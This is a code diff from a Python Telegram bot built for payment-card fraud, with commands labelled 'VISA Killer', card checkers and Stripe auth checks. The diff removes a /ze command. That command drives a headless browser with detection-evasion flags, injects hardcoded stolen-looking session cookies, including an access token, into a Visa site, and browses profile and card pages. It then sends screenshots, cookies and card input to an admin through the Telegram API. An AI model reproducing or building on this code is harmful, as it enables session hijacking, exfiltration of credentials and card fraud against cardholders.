@@ -60,7 +60,7 @@ start_time = datetime.now()
 USER_DB_FILE = "users.json"
 
 # Commands we gate
-CMD_KEYS = ("bin", "kill", "kd", "ko", "zz", "dd", "ze", "st", "bt", "sort", "chk", "clean", "num", "adhar")
+CMD_KEYS = ("bin", "kill", "kd", "ko", "zz", "dd", "st", "bt", "sort", "chk", "clean", "num", "adhar")
 
 # Per-command approvals, plus a legacy/global "all" set
 approved_cmds = {k: set() for k in CMD_KEYS}
@@ -1220,8 +1220,7 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• /kd <card> - VISA Killer #2\n"
         "• /ko <card> - VISA Killer #3\n"
         "• /zz <card> - Killed v5 (fast)\n"
-        "• /dd <card> - Killed v6 (ultra-fast)\n"
-        "• /ze <card> - Killed v6 + cookies to admin\n\n"
+        "• /dd <card> - Killed v6 (ultra-fast)\n\n"
         "🔧 *Data Processing:*\n"
         "• /clean <data|file> - Advanced card cleaner\n"
         "• /sort <data|file> - Clean & sort cards\n"
@@ -1417,7 +1416,6 @@ async def cmds_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         lock("/ko <card> — VISA Killer #3", "ko"),
         lock("/zz <card> — Killed v5 (fast)", "zz"),
         lock("/dd <card> — Killed v6 (ultra-fast)", "dd"),
-        lock("/ze <card> — Killed v6 + cookies to admin", "ze"),
     ]))
 
     # Data Processing Tools
@@ -4126,304 +4124,6 @@ async def dd_cmd(update, context):
     }
     Process(target=run_dd_process, args=(card_input, update_dict), daemon=True).start()
 
-# ==== 7.7 /ze Command (Use cookies to access site and send SS to admin) ==== #
-def run_ze_process(card_input, update_dict):
-    import os, traceback, requests, time, json
-    from selenium import webdriver
-    from selenium.webdriver.chrome.service import Service
-    from selenium.webdriver.common.by import By
-    from selenium.webdriver.support.ui import WebDriverWait
-    from selenium.webdriver.support import expected_conditions as EC
-    from fake_useragent import UserAgent
-
-    CHROME_PATH = "/usr/bin/google-chrome"
-    CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
-    BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
-    
-    # Saved cookies from previous session
-    SAVED_COOKIES = [
-        {
-            "domain": "src.visa.com",
-            "httpOnly": False,
-            "name": "accessTokenMaxExpiry",
-            "path": "/",
-            "sameSite": "Lax",
-            "secure": True,
-            "value": "1766931042354"
-        },
-        {
-            "domain": "src.visa.com",
-            "httpOnly": True,
-            "name": "accessToken",
-            "path": "/",
-            "sameSite": "Lax",
-            "secure": True,
-            "value": "eyJ0eXAiOiJKV1QiLCJkY2lkIjoiMSIsImV4cCI6MTc2NjkzMTA0MiwiYWxnIjoiRVMyNTYiLCJzaWQiOiIyODIxOTMxMDk5MjYxMzUzMTc3LjE3NjY5MzA1NjIwNzEiLCJraWQiOiJlMGUxNWY4OSJ9.eyJleHAiOjE3NjY5MzEwNDIsImNuZiI6eyJhdGsiOiJ7MDAxfTpBQU14T0VITi9FeFN5ZXVBbTFuWXlNOXNPZnlFUFhhL0VBdm4wV2JHdExUaCtUaDVXOUlYUGVocVU3ei8xakJoNWhYVFVhVmlpTEVOeFdJbEtQUlhST0VNeTlDSFVVenFYT0NVMlRNTHNveWtMWmJ2NzZ5c0ZTTTd4Z01DTmdDekdYd0NYZjRPK25rV1dFdzZ1d05jUWRuZVRhMXF0WWZOdE44TkgzZ1ZuanVTNUp6cUxuOFByak0rc1k3ZnowazRNbTBackd1YU1kcUNnSk1IRlk1M3pmRVIyUFA3d0tLQ3g4T01uQ1d6YWlmdzVzNlRPOVVYTnVlQ09yemRkNEdhQUlIZFhIcnlDVEFhVmJvMTg4UmEvcmRRMExlVzlDcjBMNlRsNC9Ib2s3TFFseE9rTnNqcCs5bm5kK0VjYnNScEI5L3hSRWx1dG5qMVRjeHh3MmtSL0RwZWJvT1VqaXBKMm1tS0IwcVlCNnFkTjNMbzNXV0U0RlRJa2tNb0ZCU2ZxSzRZRWFLR0ZsWFM5YWJNM3laYmFwOVo1M2JzV0tXaTVkbXRmZ3ZXb0JtM2RXcXBDckNhZDQxSjczREYwaWlCL2xlNlcyRW9vU25BWlE3bjM3UlFHckpZNlZkeHd4eXoxUUh3TCtxdlhjZ1RBYWlkSUJ4T3V0Y0NkdnRvOFB2QU4vd3NJUHNFZklhbnl0SGpmUWNNYlJSK01PZlFHSm5lcmVMMk5nRGxnOHdQaS92KzJwUG9mblBNTGhRd2xKQ2x1K2RhWXNHejgwbWZQcDVNYXhpQWt4RFZ3SnA2TzF4R2JLRU1raVpwVkxHT0R4MUZqSmpwbUNSelp3NStNL2NyTjY0T1ltM21VcGRRWEhJZlh6SlZ1MnB6K0JFcHhEMFozRGpYcUVJQWxDM1EvVmxwNm1IQTNKditoVjQ3MnQvUUYzcG9JWWREOUZVOTdzU3ErZUxaTlJJaVpVTVJjczk3b1RmS2NxeGN5amdqQW9tY0xpWDF5Z1p4TkxoNVlvK3Q0enUrT0pka2JSM1d4cGl3N2FqVlB5Q2NKY2EwRUlxWlVDaE9tc0R2ZlZGV2V2VFcifX0.mFdXauxnHlh9QPCFRyR8SqmGokFiv-GbwX21h4C63CU7VAxceO3smfe9cO_FX_DWheYYiJyNOLnHyUQ1DNMDTw"
-        },
-        {
-            "domain": ".visa.com",
-            "httpOnly": True,
-            "name": "x-via-hint",
-            "path": "/",
-            "sameSite": "Lax",
-            "secure": True,
-            "value": "1_RMwgZA"
-        },
-        {
-            "domain": "src.visa.com",
-            "httpOnly": False,
-            "name": "wscrCookieConsent",
-            "path": "/",
-            "sameSite": "Lax",
-            "secure": True,
-            "value": "1=true&2=true&3=true&4=true&5=true&visitor=6465aee0-6dcc-4811-9783-aad6b8612741&version=20251222-002&consent=explicit"
-        },
-        {
-            "domain": "src.visa.com",
-            "httpOnly": False,
-            "name": "NEXT_COUNTRY_PREFERENCE",
-            "path": "/",
-            "sameSite": "Lax",
-            "secure": False,
-            "value": "US"
-        },
-        {
-            "domain": "src.visa.com",
-            "httpOnly": False,
-            "name": "NEXT_LOCALE",
-            "path": "/",
-            "sameSite": "Lax",
-            "secure": False,
-            "value": "en"
-        }
-    ]
-
-    def _env_int(name: str, default: int) -> int:
-        raw = os.environ.get(name)
-        if raw is None or str(raw).strip() == "":
-            return default
-        try:
-            return int(str(raw).strip())
-        except Exception:
-            return default
-
-    BOT_ADMIN_ID = _env_int("BOT_ADMIN_ID", 123456789)
-
-    def edit_message(text):
-        payload = {
-            "chat_id": update_dict["chat_id"],
-            "message_id": update_dict["message_id"],
-            "text": text,
-            "parse_mode": "Markdown"
-        }
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
-        try:
-            requests.post(url, data=payload, timeout=5)
-        except Exception:
-            pass
-
-    def send_screenshot_to_admin(driver, caption_text):
-        """Take screenshot and send to admin"""
-        timestamp = int(time.time())
-        screenshot_filename = f"ze_ss_{timestamp}.png"
-        try:
-            driver.save_screenshot(screenshot_filename)
-            with open(screenshot_filename, "rb") as img:
-                files = {"photo": img}
-                payload = {
-                    "chat_id": BOT_ADMIN_ID,
-                    "caption": caption_text,
-                    "parse_mode": "Markdown"
-                }
-                requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
-                    data=payload,
-                    files=files,
-                    timeout=15
-                )
-            return True
-        except Exception as e:
-            try:
-                requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    data={
-                        "chat_id": BOT_ADMIN_ID,
-                        "text": f"⚠️ ZE Screenshot failed:\n```\n{str(e)[:300]}\n```",
-                        "parse_mode": "Markdown"
-                    },
-                    timeout=5
-                )
-            except Exception:
-                pass
-            return False
-        finally:
-            try:
-                os.remove(screenshot_filename)
-            except Exception:
-                pass
-
-    def send_cookies_to_admin(driver, card_info):
-        """Save current cookies and send to admin"""
-        timestamp = int(time.time())
-        cookie_filename = f"ze_cookies_{timestamp}.json"
-        try:
-            cookies = driver.get_cookies()
-            cookie_data = {
-                "card": card_info,
-                "url": driver.current_url,
-                "timestamp": timestamp,
-                "cookies": cookies
-            }
-            with open(cookie_filename, "w") as f:
-                json.dump(cookie_data, f, indent=2)
-            
-            with open(cookie_filename, "rb") as doc:
-                files = {"document": doc}
-                payload = {
-                    "chat_id": BOT_ADMIN_ID,
-                    "caption": f"🍪 ZE Cookies\n💳 Card: `{card_info}`\n🔗 URL: {driver.current_url}\n📊 Count: {len(cookies)}",
-                    "parse_mode": "Markdown"
-                }
-                requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
-                    data=payload,
-                    files=files,
-                    timeout=15
-                )
-            return True
-        except Exception:
-            return False
-        finally:
-            try:
-                os.remove(cookie_filename)
-            except Exception:
-                pass
-
-    def admin_report(trace, driver=None):
-        if driver:
-            send_screenshot_to_admin(driver, f"❌ ZE Error:\n```\n{trace[:800]}\n```")
-        else:
-            try:
-                requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    data={
-                        "chat_id": BOT_ADMIN_ID,
-                        "text": f"❌ ZE Error:\n```\n{trace[:900]}\n```",
-                        "parse_mode": "Markdown"
-                    },
-                    timeout=5
-                )
-            except Exception:
-                pass
-
-    start = time.time()
-    driver = None
-
-    try:
-        edit_message("🍪 Loading cookies...")
-
-        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
-        options = webdriver.ChromeOptions()
-        options.binary_location = CHROME_PATH
-        options.add_argument(f"user-agent={ua}")
-        options.add_argument("--disable-blink-features=AutomationControlled")
-        options.add_argument("--headless=new")
-        options.add_argument("--no-sandbox")
-        options.add_argument("--disable-dev-shm-usage")
-        options.add_argument("--window-size=1920,1080")
-        options.add_argument("--disable-gpu")
-        options.add_argument("--disable-extensions")
-        options.add_experimental_option("excludeSwitches", ["enable-automation"])
-        options.add_experimental_option('useAutomationExtension', False)
-
-        service = Service(executable_path=CHROME_DRIVER_PATH)
-        driver = webdriver.Chrome(service=service, options=options)
-        wait = WebDriverWait(driver, 5)
-
-        # Step 1: Go to visa.com first to set domain
-        edit_message("🌐 Opening VISA site...")
-        driver.get("https://src.visa.com")
-        time.sleep(2)
-        
-        # Step 2: Add saved cookies
-        edit_message("🍪 Injecting cookies...")
-        cookies_added = 0
-        for cookie in SAVED_COOKIES:
-            try:
-                # Remove expiry if present (let browser handle it)
-                cookie_to_add = {k: v for k, v in cookie.items() if k != 'expiry'}
-                driver.add_cookie(cookie_to_add)
-                cookies_added += 1
-            except Exception as e:
-                pass
-        
-        # Step 3: Screenshot after adding cookies (before navigation)
-        send_screenshot_to_admin(driver, f"📸 ZE Step 1: After adding {cookies_added} cookies\n🔗 URL: {driver.current_url}")
-        
-        # Step 4: Navigate to different pages and screenshot
-        edit_message("🔄 Testing cookie session...")
-        
-        # Try main page
-        driver.get("https://src.visa.com/login")
-        time.sleep(3)
-        send_screenshot_to_admin(driver, f"📸 ZE Step 2: Login page\n🔗 URL: {driver.current_url}")
-        
-        # Try profile/dashboard
-        driver.get("https://src.visa.com/profile")
-        time.sleep(3)
-        send_screenshot_to_admin(driver, f"📸 ZE Step 3: Profile page\n🔗 URL: {driver.current_url}")
-        
-        # Try cards page
-        driver.get("https://src.visa.com/profile/cards")
-        time.sleep(3)
-        send_screenshot_to_admin(driver, f"📸 ZE Step 4: Cards page\n🔗 URL: {driver.current_url}")
-        
-        # Send final cookies
-        send_cookies_to_admin(driver, card_input)
-        
-        duration = round(time.time() - start, 2)
-        edit_message(
-            f"✅ **ZE Cookie Test Complete**\n\n"
-            f"🍪 Cookies added: {cookies_added}\n"
-            f"📸 Screenshots sent to admin\n"
-            f"🔗 Final URL: {driver.current_url}\n"
-            f"⏱ Time: {duration}s"
-        )
-
-    except Exception as e:
-        trace = traceback.format_exc()
-        edit_message(f"❌ ZE Error: `{e}`")
-        admin_report(trace, driver)
-    finally:
-        try:
-            if driver:
-                driver.quit()
-        except Exception:
-            pass
-
-
-async def ze_cmd(update, context):
-    uid = update.effective_user.id
-    if not is_approved(uid, "ze"):
-        await update.message.reply_text("⛔ You are not approved to use /ze", reply_to_message_id=update.message.message_id)
-        return
-
-    if not is_cmd_enabled("ze"):
-        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
-        return
-
-    # For /ze, card input is optional - just used for logging
-    raw_input = " ".join(context.args) if context.args else "test"
-    card_input = raw_input if raw_input else "test"
-
-    msg = await update.message.reply_text("🍪 Starting ZE cookie test...", reply_to_message_id=update.message.message_id)
-    update_dict = {
-        "user_id": uid,
-        "chat_id": update.effective_chat.id,
-        "message_id": msg.message_id
-    }
-    Process(target=run_ze_process, args=(card_input, update_dict), daemon=True).start()
-
 # ==== 8. STRIPE AUTH V1 (/st) — Single Only (batch removed) ==== #
 def extract_all_card_inputs(raw_text: str):
     t = (raw_text or "").replace("\r", "\n")
@@ -5991,7 +5691,6 @@ async def main():
         app.add_handler(CommandHandler("ko", ko_cmd))
         app.add_handler(CommandHandler("zz", zz_cmd))
         app.add_handler(CommandHandler("dd", dd_cmd))
-        app.add_handler(CommandHandler("ze", ze_cmd))
         app.add_handler(CommandHandler("st", st_cmd))
         app.add_handler(CommandHandler("bt", bt_cmd))
         app.add_handler(CommandHandler("chk", chk_cmd))
